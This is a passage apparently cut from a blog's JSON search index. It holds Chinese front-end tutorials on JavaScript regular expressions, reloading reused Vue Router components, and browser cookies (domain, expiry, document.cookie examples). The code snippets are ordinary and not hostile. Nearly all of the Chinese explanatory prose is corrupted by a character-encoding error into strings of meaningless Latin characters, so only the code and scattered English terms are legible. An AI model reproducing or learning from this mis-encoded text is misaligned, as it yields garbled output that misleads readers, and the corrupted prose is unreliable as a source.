reg1.test(\u0026#39;def\u0026#39;) // false [0-9a-fA-F] [a-zA-Z0-9_-] // æ˜¯æŒ‡å¤§å°å†™å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€æ¨ªçº¿ä¸­çš„ä¸€ä¸ªå­—ç¬¦ ç²¾ç¡®åŒ¹é…æ¬¡æ•°{} {n} ç²¾ç¡®åŒ¹é…næ¬¡ {n,} åŒ¹é…næ¬¡ä»¥ä¸Š {n,m} åŒ¹é…n-mæ¬¡ è½¬ä¹‰ç¬¦: å¦‚æœè¦åŒ¹é…ç‰¹æ®Šå«ä¹‰çš„å…ƒå­—ç¬¦æœ¬èº«ï¼Œéœ€è¦åœ¨å®ƒä»¬å‰é¢è¦åŠ ä¸Šåæ–œæ ã€‚æ¯”å¦‚è¦åŒ¹é…+ï¼Œå°±è¦å†™æˆ\\+ /1+1/.test(\u0026#39;1+1\u0026#39;) // false /1\\+1/.test(\u0026#39;1+1\u0026#39;) // true ç‰¹æ®Šå­—ç¬¦ æ­£åˆ™è¡¨è¾¾å¼å¯¹ä¸€äº›ä¸èƒ½æ‰“å°çš„ç‰¹æ®Šå­—ç¬¦ï¼Œæä¾›äº†è¡¨è¾¾æ–¹æ³•ã€‚ \\cX è¡¨ç¤ºCtrl-[X]ï¼Œå…¶ä¸­çš„Xæ˜¯A-Zä¹‹ä¸­ä»»ä¸€ä¸ªè‹±æ–‡å­—æ¯ï¼Œç”¨æ¥åŒ¹é…æ§åˆ¶å­—ç¬¦ [\\b] åŒ¹é…é€€æ ¼é”®(U+0008)ï¼Œä¸è¦ä¸\\bæ··æ·† \\n åŒ¹é…æ¢è¡Œé”® \\r åŒ¹é…å›è½¦é”® \\t åŒ¹é…åˆ¶è¡¨ç¬¦ tabï¼ˆU+0009ï¼‰ \\v åŒ¹é…å‚ç›´åˆ¶è¡¨ç¬¦ï¼ˆU+000Bï¼‰ \\f åŒ¹é…æ¢é¡µç¬¦ï¼ˆU+000Cï¼‰ \\0 åŒ¹é…nullå­—ç¬¦ï¼ˆU+0000ï¼‰ \\xhh åŒ¹é…ä¸€ä¸ªä»¥ä¸¤ä½åå…­è¿›åˆ¶æ•°\\x00-\\xFFè¡¨ç¤ºçš„å­—ç¬¦ \\uhhhh åŒ¹é…ä¸€ä¸ªä»¥å››ä½åå…­è¿›åˆ¶æ•°\\u0000-\\uFFFFè¡¨ç¤ºçš„ Unicode å­—ç¬¦ é¢„å®šä¹‰æ¨¡å¼ \\d åŒ¹é…0-9ä¹‹é—´çš„ä»»ä¸€æ•°å­—ï¼Œç›¸å½“äº[0-9] \\D åŒ¹é…æ‰€æœ‰0-9ä»¥å¤–çš„å­—ç¬¦ï¼Œç›¸å½“äº[^0-9] \\w åŒ¹é…ä»»æ„çš„å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œç›¸å½“äº[A-Za-z0-9_] \\W é™¤æ‰€æœ‰å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ä»¥å¤–çš„å­—ç¬¦ï¼Œç›¸å½“äº[^A-Za-z0-9_] \\s åŒ¹é…ç©ºæ ¼ï¼ˆåŒ…æ‹¬æ¢è¡Œç¬¦ã€åˆ¶è¡¨ç¬¦ã€ç©ºæ ¼ç¬¦ç­‰ï¼‰ï¼Œç›¸ç­‰äº[ \\t\\r\\n\\v\\f] \\S åŒ¹é…éç©ºæ ¼çš„å­—ç¬¦ï¼Œç›¸å½“äº[^ \\t\\r\\n\\v\\f] \\b åŒ¹é…è¯çš„è¾¹ç•Œ \\B åŒ¹é…éè¯è¾¹ç•Œï¼Œå³åœ¨è¯çš„å†…éƒ¨ const reg = /a\\b/ const reg1 = /a\\B/ const str = \u0026#39;abcdef\u0026#39; reg.test(str) // false reg1.test(str) // true äºŒã€å¸¸ç”¨ç¤ºä¾‹ // éç©º `/\\S/` 1.ç‰ˆæœ¬å· // éªŒè¯ç‰ˆæœ¬å·çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œé€‚é…ï¼šx.x.xã€x.x.x-beta.xã€x.x.x-alpha.xæ ¼å¼ let reg = /^\\d+(\\.\\d+){2}(-([a-z]+)\\.\\d+)?$/i reg.test(\u0026#34;1.2.15-beta.15\u0026#34;) // true // 1.\\d+ åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­— // 2.(\\.\\d+){2} åŒ¹é…ç‚¹å·å’Œä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—ï¼Œé‡å¤2æ¬¡ // 3.(-([a-z]+)\\.\\d+)? åŒ¹é…å¯é€‰çš„ - å¼€å¤´çš„å­—ç¬¦ä¸²å’Œä¸€ä¸ªæˆ–å¤šä¸ªå°å†™å­—æ¯å’Œç‚¹å·ï¼Œä»¥åŠä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—ï¼Œä¾‹å¦‚ -beta.1ã€ -alpha.2 ç­‰ // 4.$ åŒ¹é…å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚^ åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½® // 5./i è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼Œå³å¿½ç•¥ -beta æˆ– -Beta çš„å¤§å°å†™å·®å¼‚ è‹¥éœ€æ»¡è¶³æ¯ä½ç‰ˆæœ¬å·ä¸èƒ½ä»¥0å¼€å¤´ï¼Œä¸”ä¸èƒ½å…¨éƒ¨ä¸º0çš„è¦æ±‚ï¼Œåˆ™éœ€è¦è‡ªè¡Œæ‹“å±•\n2.å­—ç¬¦ä¸²: æ¨¡ç‰ˆæ¸²æŸ“ // 1.åˆ©ç”¨éè´ªå©ªåŒ¹é… /\\{\\{(.*?)\\}\\}/g åŒ¹é…åˆ°åˆ°æ‰€æœ‰çš„ {{name}}ï¼Œ{{age}} // 2.åˆ©ç”¨str.replace(regexp|substr, newSubStr|function) ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯ fucntion (replacement) ï¼Œè¯¥å‡½æ•°çš„è¿”å›å€¼å°†æ›¿æ¢æ‰ç¬¬ä¸€ä¸ªå‚æ•°åŒ¹é…åˆ°çš„ç»“æœï¼Œå°†æ‰€æœ‰åŒ¹é…åˆ°çš„å­—ç¬¦æ›¿æ¢æˆæŒ‡å®šçš„å­—ç¬¦ var template = \u0026#34;{{name}}å¾ˆå‰å®³ï¼Œæ‰{{age}}å²\u0026#34; var context = {name:\u0026#34;bottle\u0026#34;,age:\u0026#34;15\u0026#34;} function render(template, context) { return template.replace(/{{(.*?)}}/g, (match, key) =\u0026gt; context[key.trim()]) } console.log(render(template, context)); // \u0026#34;bottleå¾ˆå‰å®³ï¼Œæ‰15å²\u0026#34; å‚è€ƒ RegExpå¯¹è±¡.é˜®ä¸€å³° æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/js-regular/","summary":"\u003cp\u003eæ­£åˆ™è¡¨è¾¾å¼ï¼ˆregular expressionï¼‰æ˜¯ä¸€ç§è¡¨è¾¾æ–‡æœ¬æ¨¡å¼ï¼ˆå³å­—ç¬¦ä¸²ç»“æ„ï¼‰çš„æ–¹æ³•ï¼Œæœ‰ç‚¹åƒå­—ç¬¦ä¸²çš„æ¨¡æ¿ï¼Œå¸¸å¸¸ç”¨æ¥æŒ‰ç…§â€œç»™å®šæ¨¡å¼â€åŒ¹é…æ–‡æœ¬\u0026hellip;\u003c/p\u003e","title":"JavaScriptæ­£åˆ™è¡¨è¾¾å¼"},{"content":"Vueå¼€å‘é—®é¢˜æ±‡æ€»\u0026hellip;\nä¸€ã€Router 1.VueRouter åŒä¸€ä¸ª/å¤šä¸ªè·¯ç”±(å¤ç”¨åŒä¸€ä¸ªç»„ä»¶)é¡µé¢ä¸é‡æ–°åŠ è½½ é—®é¢˜æè¿°ï¼šé‡åˆ°ç›¸ä¼¼çš„é¡µé¢ç»“æ„ï¼Œæˆ‘ä»¬é€šå¸¸é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼åŠ è½½åŒä¸€ä¸ªç»„ä»¶ï¼Œè¾¾åˆ°ç»„ä»¶å®ä¾‹å¤ç”¨çš„æ•ˆæœã€‚æ¯•ç«Ÿï¼Œä¸¤ä¸ªè·¯ç”±éƒ½æ¸²æŸ“åŒä¸ªç»„ä»¶ï¼Œæ¯”èµ·é”€æ¯å†åˆ›å»ºï¼Œå¤ç”¨åˆ™æ˜¾å¾—æ›´åŠ é«˜æ•ˆã€‚\nå¤šä¸ªè·¯ç”± ä¸€ä¸ªè·¯ç”±æ·»åŠ ä¸åŒçš„queryã€paramsç­‰å‚æ•°åŒºåˆ†çŠ¶æ€ã€‚ ä¸è¿‡ï¼Œå¤ç”¨ç»„ä»¶å®ä¾‹æ„å‘³ç€ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸé’©å­ä¸ä¼šå†è¢«è°ƒç”¨ã€‚é‚£ä¹ˆä¼šå¯¼è‡´ä¸¤ç§æƒ…å†µï¼š\næƒ³å¯¹è·¯ç”±å‚æ•°çš„å˜åŒ–ä½œå‡ºå“åº”çš„è¯ï¼Œå¯ä»¥ç®€å•åœ° watch (ç›‘æµ‹å˜åŒ–) $route å¯¹è±¡ export default { mounted () { this.reload() }, methods: { reload () {} }, watch: { \u0026#39;$route\u0026#39; (to, from) { console.log(\u0026#39;to=\u0026#39; + to) this.reload() } } } å‚æ•°å˜æ›´æˆ–è€…è·¯ç”±å˜åŒ–æƒ³è¦é‡æ–°åŠ è½½ç»„ä»¶å®ä¾‹æ—¶ï¼Œåˆ™éœ€è¦ Layoutå†…çš„router-viewé‡æ–°åŠ è½½ router-view å¢åŠ keyä¸è¿‡è¿™ç§æ–¹å¼å­˜åœ¨çš„å¼Šç«¯å¯ä»¥æ€è€ƒä¸€ä¸‹ ç”¨v-ifæ§åˆ¶router-viewï¼Œåœ¨æ ¹ç»„ä»¶APP.vueä¸­å®ç°ä¸€ä¸ªreloadæ–¹æ³• ç¬¬ä¸€ç§:\n\u0026lt;router-view :key=\u0026#34;$route.fullPath\u0026#34;\u0026gt;\u0026lt;/router-view\u0026gt; ç¬¬äºŒç§ï¼š\nLayout\n\u0026lt;template class=\u0026#34;dashboard-layout\u0026#34;\u0026gt; \u0026lt;!-- Layout left-menu --\u0026gt; \u0026lt;left-menu\u0026gt;\u0026lt;/left-menu\u0026gt; \u0026lt;!-- Layout main --\u0026gt; \u0026lt;container\u0026gt; \u0026lt;router-view v-if=\u0026#34;isRouterAlive\u0026#34; @collapseOrOpenMenu=\u0026#34;collapseOrOpenMenu\u0026#34;\u0026gt;\u0026lt;/router-view\u0026gt; \u0026lt;/container\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { name: \u0026#39;AppLayout\u0026#39;, components: {}, data() { return {} }, computed: {}, methods: { async reload() { this.isRouterAlive = false // TODOï¼šåŠ è½½æ•°æ® await this.getAppMenus() this.$nextTick(() =\u0026gt; (this.isRouterAlive = true)) } }, async created() { // TODOï¼šåŠ è½½æ•°æ® await this.getAppMenus() window.APP_PAGE_ROOT = this } } \u0026lt;/script\u0026gt; å¤ç”¨ç»„ä»¶è°ƒç”¨reload()\n\u0026lt;template class=\u0026#34;dashboard-page\u0026#34;\u0026gt; // ... content \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { name: \u0026#39;ReusableComponent\u0026#39;, components: {}, data() { return {} }, computed: {}, watch: { $route: { deep: true, immediate: false, handler: function(to, from) { console.log(\u0026#39;--page-preview-to--\u0026#39;, to) if (to.path === \u0026#39;/dashboard/page\u0026#39; \u0026amp;\u0026amp; to.query.pageId !== from.query.pageId) { if (!window.APP_PAGE_ROOT) return window.location.reload() window.APP_PAGE_ROOT.reload() } } } }, methods: {} } \u0026lt;/script\u0026gt; æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/vue%E5%BC%80%E5%8F%91%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/","summary":"\u003cp\u003eVueå¼€å‘é—®é¢˜æ±‡æ€»\u0026hellip;\u003c/p\u003e","title":"Vueå¼€å‘é—®é¢˜æ±‡æ€»"},{"content":"æˆ‘ä»¬éƒ½çŸ¥é“HTTPåè®®æ˜¯æ— çŠ¶æ€çš„ï¼Œè¿™ç§æ— çŠ¶æ€æ„å‘³ç€ç¨‹åºéœ€è¦éªŒè¯æ¯ä¸€æ¬¡è¯·æ±‚ï¼Œä»è€Œè¾¨åˆ«å®¢æˆ·ç«¯çš„èº«ä»½ã€‚ Cookieï¼Œå°±æ˜¯ä¸ºäº†è¾¨åˆ«å®¢æˆ·ç«¯èº«ä»½è€Œå‚¨å­˜åœ¨å®¢æˆ·ç«¯æœ¬åœ°çš„æ•°æ®\nä¸€ã€ä»‹ç»Cookie Cookieç”±æœåŠ¡å™¨ç”Ÿæˆï¼Œå‘é€ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨æŠŠcookieä¿å­˜åˆ°å†…å­˜ä¸­æˆ–è€…æŸä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶å†…ï¼Œä¸‹ä¸€æ¬¡è¯·æ±‚åŒä¸€ç½‘ç«™æ—¶ä¼šæŠŠè¯¥cookieå‘é€ç»™æœåŠ¡å™¨\nç”±äºcookieæ˜¯ä¿å­˜åœ¨å®¢æˆ·ç«¯ä¸Šçš„ï¼Œæ‰€ä»¥æµè§ˆå™¨åŠ å…¥äº†ä¸€äº›é™åˆ¶ç¡®ä¿ cookie ä¸ä¼šè¢«æ¶æ„ä½¿ç”¨ï¼ŒåŒæ—¶ä¸ä¼šå æ®å¤ªå¤šç£ç›˜ç©ºé—´ï¼Œæ‰€ä»¥ cookie çš„æ•°é‡å’Œå¤§å°æ˜¯æœ‰é™çš„ã€‚ ä¸åŒæµè§ˆå™¨å¯¹ cookie æ•°é‡å’Œå¤§å°çš„é™åˆ¶ï¼Œæ˜¯ä¸ä¸€æ ·çš„ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå•ä¸ªåŸŸè®¾ç½®çš„ cookie ä¸åº”è¶…è¿‡50ä¸ªï¼Œæ¯ä¸ª cookie çš„å¤§å°ä¸èƒ½è¶…è¿‡4KBã€‚è¶…è¿‡é™åˆ¶ä»¥åï¼Œcookie å°†è¢«å¿½ç•¥ï¼Œä¸ä¼šè¢«è®¾ç½®\näºŒã€Cookieä½œç”¨ å¯¹è¯ç®¡ç†ï¼šä¿å­˜å·²ç™»å½•ç”¨æˆ·çš„å‡­è¯ ç®€å•çš„ç¼“å­˜ï¼šå­˜å‚¨ä¸€äº›ç®€å•çš„ä¸šåŠ¡æ•°æ®ï¼Œæ¯”å¦‚è´­ç‰©è½¦ç­‰éœ€è¦è®°å½•çš„ä¿¡æ¯ ä¸ªæ€§åŒ–ï¼šä¿å­˜ç”¨æˆ·çš„åå¥½ï¼Œæ¯”å¦‚ç½‘é¡µçš„å­—ä½“å¤§å°ã€èƒŒæ™¯è‰²ç­‰ç­‰ è¿½è¸ªï¼šè®°å½•å’Œåˆ†æç”¨æˆ·è¡Œä¸º ä¸‰ã€Cookieç±»åˆ« ç¬¬ä¸€æ–¹cookieï¼šç”±ç›¸åŒç«™ç‚¹å‘é€çš„ cookie ç¬¬ä¸‰æ–¹cookieï¼šç”±è·¨ç«™è¯·æ±‚å‘é€çš„cookie å…³äºç›¸åŒç«™ç‚¹ã€è·¨ç«™çš„åˆ¤æ–­åœ¨è®²åˆ°samesiteå±æ€§çš„æ—¶å€™ä¼šä»‹ç»\nä¼šè¯cookieï¼šæ²¡æœ‰è®¾ç½®æœ‰æ•ˆæ—¶é—´çš„ cookieã€‚åªè¦å…³é—­äº†æµè§ˆå™¨ï¼ˆæ³¨æ„ä¸æ˜¯å…³é—­ç½‘é¡µé¡µé¢ï¼‰ï¼Œcookie å°±ä¼šè¢«é”€æ¯ã€‚ï¼ˆcookie å­˜åœ¨äºæµè§ˆå™¨çš„å†…å­˜ä¸­ï¼Œå½“å…³é—­äº†æµè§ˆå™¨ cookie å°±é”€æ¯äº†ï¼‰ æ°¸ä¹…cookieï¼šcookie è¢«ä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œåœ¨æœ‰æ•ˆæ—¶é—´å†…å¯é•¿æœŸå­˜åœ¨ï¼Œæµè§ˆå™¨é‡å¯æˆ–æœºå™¨é‡å¯éƒ½å¯ä»¥å†æ¬¡è¯»å–åˆ°cookie å››ã€cookieçš„ç‰¹æ€§ 1.åç«¯é€šè¿‡httpå¤´è®¾ç½® æœåŠ¡ç«¯é€šè¿‡åœ¨httpå“åº”å¤´ä¸­è®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªSet-Cookieæ¥è®¾ç½® cookie\n2.è¯·æ±‚æ—¶é€šè¿‡httpå¤´ä¼ ç»™åç«¯ æµè§ˆå™¨æ¥æ”¶åˆ°Set-CookieæŒ‡ä»¤æ—¶ï¼Œä¼šå°†cookieçš„åç§°ä¸å€¼å‚¨å­˜åœ¨æµè§ˆå™¨çš„cookieå­˜æ”¾åŒºï¼Œå¹¶è®°å½•è¯¥cookieéš¶å±çš„åŸŸåã€ç½‘å€è·¯å¾„ã€åˆ›å»ºæ—¶é—´ã€è¿‡æœŸæ—¶é—´ã€æ˜¯å¦è„šæœ¬å¯è®¿é—®ã€æ˜¯å¦ä¸ºå®‰å…¨è¿æ¥ ç­‰å±æ€§ã€‚\nå½“æµè§ˆå™¨å†æ¬¡å‘å‡ºHTTP RequestæŒ‡ä»¤åˆ°æœåŠ¡å™¨æ—¶ï¼Œå°±ä¼šæ¯”å¯¹ç›®å‰åœ¨æµè§ˆå™¨çš„ cookie å­˜æ”¾åŒºæœ‰æ²’æœ‰è¯¥åŸŸåã€è¯¥è·¯å¾„ã€å°šæœªè¿‡æœŸä»¥åŠç¬¦åˆå…¶å®ƒä¸€äº›æ¡ä»¶çš„cookieï¼Œå¦‚æœæœ‰çš„è¯å°±ä¼šåŒ…å«åœ¨ HTTP Request æŒ‡ä»¤çš„Cookieå¤´ä¸­ï¼Œå¤šä¸ªcookieä»¥åˆ†å·;åˆ†éš”ã€‚å¦‚ä¸‹å›¾: å‡è®¾æµè§ˆå™¨åœ¨è¯·æ±‚ä¸€ä¸ªç½‘é¡µæ—¶ï¼Œè¯¥ç½‘é¡µåŒ…å« 20 å¼ å›¾ã€3 ä¸ª CSS æ–‡ä»¶ã€2 ä¸ª JavaScript æ–‡ä»¶ï¼Œé‚£ä¹ˆåŒæ ·ä¸€ä»½ cookie å°±ä¼šå‘é€ 25 æ¬¡åˆ°æœåŠ¡ç«¯ï¼Œå¦‚æœ cookie çš„å¤§å°æœ‰ 4K çš„è¯ï¼Œå…‰æ˜¯æµè§ˆä¸€ä¸ªç½‘é¡µä½ å¯èƒ½å°±è¦ä»ä½ çš„ç”µè„‘å‘é€å‡º 100KB çš„æ•°æ®ã€‚ æ‰€ä»¥ä½¿ç”¨ cookie å¹¶éã€Œå¤šå¤šç›Šå–„ã€ï¼Œè€Œæ˜¯è¦ã€Œå°å¿ƒä½¿ç”¨ã€ï¼Œå¦åˆ™ä¼šé€ æˆä¸å¿…è¦çš„å¸¦å®½æµªè´¹ã€‚\n3.å‰ç«¯å¯è¯»å†™ Javascriptå¯ä»¥ä½¿ç”¨document.cookieå¯¹å½“å‰ç½‘ç«™çš„cookieè¿›è¡Œè¯»å†™ï¼š\næ³¨æ„ï¼šJavascript å¯è¯»å†™çš„ cookie åªèƒ½æ˜¯æ²¡æœ‰ç”¨http-onlyé™åˆ¶çš„ cookie\n// è¯»å–æµè§ˆå™¨ä¸­çš„cookie console.log(document.cookie); // å†™å…¥ä¸¤ä¸ª cookieï¼šmyname å’Œ myhome // é€šè¿‡æ‰§è¡Œå¤šæ¬¡ document.cookie=... è¯­å¥æ¥æ·»åŠ å¤šä¸ª cookie document.cookie=\u0026#39;myname=lhm;path=/;domain=.baidu.com\u0026#39;; document.cookie=\u0026#39;myhome=gd;path=/;domain=.baidu.com\u0026#39;; å¦‚æœè¦ä¿®æ”¹æŸä¸ªcookieï¼Œåªéœ€ç”¨document.cookie = ...è¯­å¥åˆ›å»ºä¸€ä¸ªåŒåçš„cookieï¼Œæ³¨æ„domainå’Œpathè¦ä¿æŒä¸€è‡´ã€‚åˆ™åŸæ¥çš„cookieä¼šè¢«è¦†ç›–ï¼Œè¾¾åˆ°ä¿®æ”¹çš„ç›®çš„ã€‚ å¦‚æœè¦åˆ é™¤æŸä¸ªcookieï¼Œç”¨document.cookie = \u0026hellip;è¯­å¥å°†cookieçš„è¿‡æœŸæ—¶é—´ä¿®æ”¹ä¸ºä¸€ä¸ªè¿‡å»çš„æ—¶é—´ï¼Œå¦‚ä¸‹ï¼š var exp = new Date(); exp.setTime(exp.getTime() - 1); document.cookie = \u0026#34;myhome=gd;path=/;domain=.baidu.com;expires=\u0026#34; + exp.toGMTString(); å°†max-ageè®¾ç½®ä¸º0ä¹Ÿèƒ½è¾¾åˆ°åˆ é™¤çš„æ•ˆæœï¼š\ndocument.cookie = \u0026#34;myhome=gd;path=/;domain=.baidu.com;max-age=0\u0026#34;; 4.éµå®ˆåŒæºç­–ç•¥ å½“å‰ç½‘é¡µåªèƒ½è®¿é—®ä¸å®ƒåŒæºçš„ cookie\næ˜¯å¦åŒæºæ˜¯ç”¨å½“å‰ç½‘é¡µç½‘å€å’Œcookieçš„domainæ¥åˆ¤æ–­çš„ã€‚ è°·æ­Œæµè§ˆå™¨é€šè¿‡F12-Application-Storage-Cookies-å½“å‰åŸŸåæ‰€æŸ¥çœ‹åˆ°çš„ cookieï¼Œæœ‰ä¸¤ä¸ªæ¥æºï¼Œä¸€æ˜¯æœåŠ¡ç«¯é€šè¿‡åœ¨httpå“åº”å¤´ä¸­è®¾ç½®çš„ cookieï¼ŒäºŒæ˜¯æµè§ˆå™¨åœ¨æœ¬åœ°æ‰€è¯»å–åˆ°çš„ cookieã€‚åœ¨æœ¬åœ°è¯»å– cookie å°±éœ€è¦éµå®ˆåŒæºç­–ç•¥\næµè§ˆå™¨çš„åŒæºç­–ç•¥ä¸­çš„åŒæºæŒ‡çš„æ˜¯åè®®ã€åŸŸåã€ç«¯å£ä¸‰è€…ç›¸åŒï¼Œè€Œcookieçš„åŒæºä»…è¦æ±‚åŸŸåï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸¤ä¸ªç½‘å€åªè¦åŸŸåç›¸åŒï¼Œå°±å¯ä»¥å…±äº«cookieï¼Œæ³¨æ„ï¼Œè¿™é‡Œä¸è¦æ±‚åè®®å’Œç«¯å£ç›¸åŒã€‚ æ‰€ä»¥https://example.com:8080/å’Œhttp://example.com:8081/çš„cookieæ˜¯å…±äº«çš„ï¼Œå› ä¸ºå®ƒä»¬çš„domainéƒ½æ˜¯example.com åŒæºç­–ç•¥è®¤ä¸ºåŸŸå’Œå­åŸŸå±äºä¸åŒçš„åŸŸï¼Œä¾‹å¦‚child1.a.comä¸a.comã€child1.a.comä¸child2.a.comã€xxx.child1.a.comä¸child1.a.comä¸¤ä¸¤ä¸åŒæº ä¸€ä¸ªé¡µé¢å¯ä»¥ä¸ºæœ¬åŸŸå’Œä»»ä½•çˆ¶åŸŸè®¾ç½®cookieï¼Œåªè¦çˆ¶åŸŸä¸æ˜¯å…¬å…±åç¼€ï¼ˆpublic suffixï¼‰å³å¯ æ‰€ä»¥ä¸¤ä¸ªä¸åŒçš„å­åŸŸæƒ³è¦å…±äº«cookieï¼Œåªè¦æŠŠ cookie çš„domainè®¾æˆç›¸åŒçš„çˆ¶åŸŸå³å¯ã€‚ æ¯”å¦‚ï¼Œhttp://child1.a.com å’Œ http://child2.a.com æƒ³è¦å…±äº«cookieï¼Œåªè¦æŠŠå®ƒä»¬çš„ cookie çš„domainè®¾ç½®æˆa.comå³å¯\nè®¾ç½®cookieçš„æ—¶å€™ï¼Œå¦‚æœæŒ‡å®šcookieçš„æ‰€å±åŸŸåä¸ºåƒä¸Šé¢ä¾‹å­ä¸­çš„.baidu.comè¿™æ ·çš„é¡¶çº§åŸŸåï¼Œé‚£ä¹ˆäºŒçº§åŸŸåå’Œä¸‰çº§åŸŸåä¸ç”¨åšä»»ä½•è®¾ç½®ï¼Œéƒ½å¯ä»¥è¯»å–è¿™ä¸ªcookie\näº”ã€Cookieå±æ€§ 1.Expiresï¼ŒMax-Age Expireså±æ€§æŒ‡å®šä¸€ä¸ªå…·ä½“çš„åˆ°æœŸæ—¶é—´ï¼Œåˆ°äº†æŒ‡å®šæ—¶é—´ä»¥åï¼Œæµè§ˆå™¨å°±ä¸å†ä¿ç•™è¿™ä¸ªcookieã€‚å®ƒçš„å€¼æ˜¯UTCæ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨Date.prototype.toUTCString()è¿›è¡Œæ ¼å¼è½¬æ¢ Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; æµè§ˆå™¨æ ¹æ®æœ¬åœ°æ—¶é—´ï¼Œå†³å®š cookie æ˜¯å¦è¿‡æœŸï¼Œç”±äºæœ¬åœ°æ—¶é—´æ˜¯ä¸ç²¾ç¡®çš„ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•ä¿è¯ cookie ä¸€å®šä¼šåœ¨æœåŠ¡å™¨æŒ‡å®šçš„æ—¶é—´è¿‡æœŸ\nMax-Ageå±æ€§æŒ‡å®šä»ç°åœ¨å¼€å§‹ cookie å­˜åœ¨çš„ç§’æ•°ï¼Œæ¯”å¦‚60 * 60 * 24 * 365ï¼ˆå³ä¸€å¹´ï¼‰ã€‚è¿‡äº†è¿™ä¸ªæ—¶é—´ä»¥åï¼Œæµè§ˆå™¨å°±ä¸å†ä¿ç•™è¿™ä¸ª cookieã€‚ å¦‚æœåŒæ—¶æŒ‡å®šäº†Expireså’ŒMax-Ageï¼Œé‚£ä¹ˆMax-Ageçš„å€¼å°†ä¼˜å…ˆç”Ÿæ•ˆã€‚ å¦‚æœSet-Cookieå­—æ®µæ²¡æœ‰æŒ‡å®šExpiresæˆ–Max-Ageå±æ€§ï¼Œé‚£ä¹ˆè¿™ä¸ªcookieå°±æ˜¯Session Cookieï¼Œå³å®ƒåªåœ¨æœ¬æ¬¡å¯¹è¯å­˜åœ¨ï¼Œä¸€æ—¦ç”¨æˆ·å…³é—­æµè§ˆå™¨ï¼Œæµè§ˆå™¨å°±ä¸ä¼šå†ä¿ç•™è¿™ä¸ªcookie 2.Domain Domainå±æ€§æŒ‡å®šæµè§ˆå™¨å‘å‡ºHTTPè¯·æ±‚æ—¶ï¼Œå“ªäº›åŸŸåè¦é™„å¸¦è¿™ä¸ªcookie\nå¦‚æœæ²¡æœ‰æŒ‡å®šè¯¥å±æ€§ï¼Œæµè§ˆå™¨ä¼šé»˜è®¤å°†å…¶è®¾ä¸ºå½“å‰åŸŸåï¼Œè¿™æ—¶å­åŸŸåå°†ä¸ä¼šé™„å¸¦è¿™ä¸ª cookie ã€‚ æ¯”å¦‚ï¼Œexample.comä¸è®¾ç½® cookie çš„domainå±æ€§ï¼Œé‚£ä¹ˆsub.example.comå°†ä¸ä¼šé™„å¸¦è¿™ä¸ª cookie\nä¸¾ä¾‹éªŒè¯ä¸€ä¸‹ï¼š\n1ã€ä¿®æ”¹hostsæ–‡ä»¶ï¼Œä¸ºæœ¬åœ°è®¾ç½®äº†ä¸¤ä¸ªåŸŸå 2ã€åœ¨elin.comä¸‹çš„é¡µé¢è®¾ç½®cookieï¼Œè¯¥ cookie ä¸è®¾ç½®domain 3ã€è®¿é—®è¯¥é¡µé¢å¹¶æŸ¥çœ‹ cookie\n4ã€è®¿é—®db.elin.comä¸‹çš„é¡µé¢å¹¶æŸ¥çœ‹ cookie\nå¯ä»¥çœ‹åˆ°å­åŸŸåå¹¶ä¸èƒ½çœ‹åˆ°è¿™ä¸ª cookie\nå¦‚æœæŒ‡å®šäº†domainå±æ€§ï¼Œé‚£ä¹ˆå­åŸŸåä¹Ÿä¼šé™„å¸¦è¿™ä¸ª 